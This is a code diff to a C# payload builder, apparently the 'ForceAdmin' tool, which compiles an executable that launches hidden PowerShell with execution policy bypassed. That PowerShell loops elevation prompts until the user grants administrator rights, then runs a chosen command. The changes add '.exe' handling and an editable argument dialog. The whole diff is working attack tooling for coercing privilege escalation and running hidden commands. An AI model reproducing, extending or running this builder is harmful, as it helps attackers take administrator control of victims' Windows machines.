@@ -15,7 +15,6 @@ public class CatzSec
         parameters.ReferencedAssemblies.Add("System.dll");
         parameters.ReferencedAssemblies.Add("System.Core.dll");
         parameters.ReferencedAssemblies.Add("System.Data.dll");
-        parameters.ReferencedAssemblies.Add("System.Drawing.dll");
         parameters.TreatWarningsAsErrors = false;
         parameters.CompilerOptions = "";
         string[] source = new string[] {"using System.Diagnostics;\nclass Program{\nstatic void Main(string[] args)\n{\nSystem.Diagnostics.Process.Start(\"powershell\", \" " + payload + "\");\n}\n}" };
@@ -45,10 +44,14 @@ public class CatzSec
 
 ");
         string outfile = logger.Ask("Enter the output file name");
+        if (outfile.EndsWith(".exe") == false){
+            outfile = outfile + ".exe";
+        }
         string payload = logger.Ask("Enter the window command to be executed").Replace("\"", "\\\"").Replace("'", "''");
         var arguments = "-NoLogo -NoProfile -Noninteractive -WindowStyle hidden -ExecutionPolicy bypass";
         if (logger.Ask("Would you like to configure the ForceAdmin powershell command? (Y/N)").ToLower() == "y"){
-            arguments = logger.Ask("Enter the powershell arguments");
+            logger.Log("Please wait for the arguments to be loaded into the input dialouge");
+            arguments = logger.CustomAsk("Edit the powershell arguments", arguments);
         }
         string command = arguments + "-Command \\\"while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/c " + payload + "';exit}catch{}} \\\" ";
         logger.Log("Generating payload...");
